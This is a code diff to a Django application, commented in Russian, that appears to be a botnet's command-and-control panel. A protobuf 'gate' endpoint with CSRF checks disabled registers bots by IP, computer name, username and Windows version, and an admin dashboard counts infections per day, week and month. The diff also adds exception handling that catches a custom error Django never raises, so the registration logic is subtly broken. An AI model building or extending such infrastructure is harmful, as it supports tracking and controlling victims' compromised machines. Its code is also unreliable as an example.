@@ -5,10 +5,17 @@ from django.contrib.auth import login
 from django.views.decorators.csrf import csrf_exempt
 from .bot_pb2 import RegisterBot
 from .models import Bot
+import datetime
+from .exceptions import BotNotFound
+#from django.core.paginator import Paginator
 
+
+# ВСПОМОГАТЕЛЬНЫЙ ФУНКЦИИ --------------------------- \/
 
 class Subsidiary:
-    def get_bot_ip(self, request):
+
+    @staticmethod
+    def get_bot_ip(request):
         x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
         if x_forwarded_for:
             ip = x_forwarded_for.split(',')[0]
@@ -16,12 +23,65 @@ class Subsidiary:
             ip = request.META.get('REMOTE_ADDR')
         return ip
 
+    @staticmethod
+    def get_by_week(_classes: iter) -> int:
+
+        res = []
+        now_date = datetime.datetime.now()
+
+        for _class in _classes:
+
+            if _class.date.isocalendar()[0] == now_date.isocalendar()[0] and \
+                    _class.date.isocalendar()[1] == now_date.isocalendar()[1]:
+                res.append(_class)
+
+        return len(res)
+
+    @staticmethod
+    def get_by_day(_classes: iter) -> int:
+
+        res = []
+        now_date = datetime.datetime.now()
+
+        for _class in _classes:
+
+            if _class.date.day == now_date.day and \
+                    _class.date.year == now_date.year and \
+                    _class.date.month == now_date.month:
+                res.append(_class)
+
+        return len(res)
+
+    @staticmethod
+    def get_by_month(_classes: iter) -> int:
+
+        res = []
+        now_date = datetime.datetime.now()
+
+        for _class in _classes:
+
+            if _class.date.year == now_date.year and \
+                    _class.date.month == now_date.month:
+                res.append(_class)
+
+        return len(res)
+
+
+# ВСПОМОГАТЕЛЬНЫЙ ФУНКЦИИ --------------------------- /\
+
+# ГЛАВНЫЙ КЛАСС АДМИНКИ --------------------------- \/
 
 class AdminPanel:
-    def get_login_page(self, request):
+    def __init__(self, subsidiary):
+        self.sub = subsidiary
+
+    @staticmethod
+    def get_login_page(request) -> render:
         return render(request, 'main/login.html')
 
-    def get_main_page(self, request):
+    def get_main_page(self, request) -> HttpResponse or render:
+        bots = Bot.objects.all()
+
         counts_is_win7 = Bot.objects.filter(is_win7=True).count()
         counts_is_win10 = Bot.objects.filter(is_win10=True).count()
         counts_is_winxp = Bot.objects.filter(is_winxp=True).count()
@@ -31,31 +91,37 @@ class AdminPanel:
         _32x = Bot.objects.filter(is_x64=False).count()
         _64x = Bot.objects.filter(is_x64=True).count()
 
-        print(counts_is_win10)
+        in_week = self.sub.get_by_week(bots)
+        in_day = self.sub.get_by_day(bots)
+        in_month = self.sub.get_by_month(bots)
+        total = bots.count()
 
         if request.user.is_superuser:
             return render(request, 'main/main.html', {'win_version': [counts_is_win7, counts_is_winxp, counts_is_win8,
                                                                       counts_is_win10, counts_is_win11],
-                                                      'x_oc': [_32x, _64x]})
+                                                      'x_oc': [_32x, _64x], 'in_week': in_week, 'in_day': in_day,
+                                                      'in_month': in_month, 'total': total})
 
         return HttpResponse('недостачно прав для просмотра ')
 
-    def get_table_page(self, request):
+    @staticmethod
+    def get_table_page(request) -> render:
         bots = Bot.objects.all()
         return render(request, 'main/table.html', {'bots': bots})
+
+
+# ГЛАВНЫЙ КЛАСС АДМИНКИ --------------------------- /\
+
+
+# ОБРАБОТЧИКИ --------------------------------------------\/
 
 
 class Handlers:
     def __init__(self, subsidiary):
         self.sub = subsidiary
 
-    def create(self, request):
-        bot = Bot(uid='1', computername='test-pc1', username='user1', is_x64=True, is_server=False, is_win10=True)
-        bot.save()
-        bot1 = Bot(uid='2', computername='test-pc2', username='user2', is_x64=True, is_server=False, is_win7=True)
-        bot1.save()
-
-    def login_handler(self, request):
+    @staticmethod
+    def login_handler(request) -> HttpResponse:
         username = request.POST['login']
         usr = User.objects.get(username=username)
 
@@ -65,7 +131,7 @@ class Handlers:
         return HttpResponse('')
 
     @csrf_exempt
-    def gate(self, request):
+    def gate(self, request) -> HttpResponse:
         bot = RegisterBot()
         bot.ParseFromString(request.body)
 
@@ -81,7 +147,8 @@ class Handlers:
 
         try:
             _bot = Bot.objects.get(uid=uid)
-        except:
+        except BotNotFound as e:
+            print(e)
             _bot = Bot(ip=ip, uid=uid, computername=computername, username=username, is_x64=is_x64, is_server=is_server)
 
         if os_major == 10 and os_minor == 0:
@@ -95,8 +162,11 @@ class Handlers:
 
         return HttpResponse('200')
 
-    def ban(self, request):
+    @staticmethod
+    def ban(request) -> HttpResponse:
         bot = Bot.objects.get(uid=request.GET['uid'])
         bot.is_banned = True
         bot.save()
         return HttpResponse('200')
+
+# ОБРАБОТЧИКИ -------------------------------------------- /\
